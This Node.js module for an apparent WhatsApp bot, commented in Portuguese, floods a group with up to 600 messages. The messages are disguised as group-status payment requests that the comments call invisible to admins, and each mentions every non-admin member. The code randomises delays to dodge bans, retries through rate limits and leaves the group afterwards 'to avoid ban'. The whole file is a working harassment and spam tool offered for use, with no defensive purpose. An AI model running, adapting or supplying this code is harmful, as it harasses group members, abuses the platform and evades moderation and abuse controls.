const fs = require('fs');

async function executarFlood(sock, groupId) {
    try {
        const gMeta = await global.getGroupMetadata(sock, groupId);
        const botId = sock.user.id.split(':')[0] + '@s.whatsapp.net';
        
        const admins = gMeta.participants.filter(v => !!v.admin).map(v => v.id);
        const participantes = gMeta.participants
            .map(u => u.id)
            .filter(id => id !== botId && !admins.includes(id));

        const fullText = global.mensagemDiv || "MARCOS PASSOU O RATO 🤪";
        let statusText = fullText;
        
        const separadorFantasma = "【↯💣─────•𖧹❀⃘࣭࣭࣭࣭ٜꔷ⃔໑࣭࣭ٜ👻❀⃘࣭࣭࣭࣭ٜꔷ⃔໑࣭࣭ٜ𖧹•─────💣↯】";
        if (statusText.includes(separadorFantasma)) {
            const parts = statusText.split(separadorFantasma);
            if (parts.length >= 3) {
                statusText = parts[0] + "\n\n" + parts.slice(2).join(separadorFantasma);
            }
        }
        statusText = statusText.replace(/```/g, "").replace(/\n{3,}/g, "\n\n").trim();

        const chatCount = 500;
        const statusCount = 100;
        const count = Math.max(chatCount, statusCount);

        console.log(`\x1b[33m[FLOOD START]\x1b[0m Iniciando flood simultâneo invisível (Chat: ${chatCount} | Status: ${statusCount})`);

        for (let i = 0; i < count; i++) {
            try {
                // 1. Status invisível para admins (groupStatusMessageV2) - limite 100
                if (i < statusCount) {
                    await sock.relayMessage(groupId, {
                        groupStatusMessageV2: {
                            message: {
                                requestPaymentMessage: {
                                    currencyCodeIso4217: "",
                                    amount1000: "0",
                                    noteMessage: {
                                        extendedTextMessage: {
                                            text: statusText,
                                            contextInfo: { isGroupStatus: true, mentionedJid: participantes }
                                        }
                                    },
                                    expiryTimestamp: "0",
                                    amount: { value: "0", offset: 1000, currencyCode: "" }
                                }
                            }
                        }
                    }, {});
                }

                // 2. Chat invisível para admins (groupStatusMessageV2) - limite 500
                if (i < chatCount) {
                    await sock.relayMessage(groupId, {
                        groupStatusMessageV2: {
                            message: {
                                requestPaymentMessage: {
                                    currencyCodeIso4217: "BRL",
                                    amount1000: "10000",
                                    noteMessage: {
                                        extendedTextMessage: {
                                            text: fullText,
                                            contextInfo: { isGroupStatus: true, mentionedJid: participantes }
                                        }
                                    },
                                    expiryTimestamp: "0",
                                    amount: { value: "10000", offset: 1000, currencyCode: "BRL" }
                                }
                            }
                        }
                    }, {});
                }

                // Delay anti-ban (entre 150ms e 300ms)
                const delayAntiBan = Math.floor(Math.random() * (300 - 150 + 1)) + 150;
                await new Promise(r => setTimeout(r, delayAntiBan));
            } catch (err) {
                const erroStr = String(err?.message || err || "").toLowerCase();
                if (erroStr.includes('rate-overlimit') || erroStr.includes('429') || erroStr.includes('bad mac')) {
                    console.log(`\x1b[33m[RATE-LIMIT]\x1b[0m Detectado limite de envio (rate-overlimit/Bad MAC). Aguardando 2.5 segundos antes de continuar...`);
                    await new Promise(r => setTimeout(r, 2500));
                    i--; // Decrementa para tentar reenviar esta iteração
                } else {
                    console.error("Erro ao enviar flood:", err?.message || err);
                }
            }
        }

        // AUTO-LEAVE: Sai do grupo após terminar o flood
        console.log(`\x1b[33m[HIT & RUN]\x1b[0m Flood finalizado. Saindo do grupo...`);
        try {
            await sock.groupLeave(groupId);
            console.log(`\x1b[32m[SAIU]\x1b[0m Saiu do grupo com sucesso para evitar ban.`);
        } catch (leaveErr) {
            console.error(`\x1b[31m[ERRO]\x1b[0m Falha ao sair do grupo:`, leaveErr.message);
        }

    } catch (err) {
        console.error("Erro ao executar flood automático:", err.message);
    }
}

module.exports = { executarFlood };
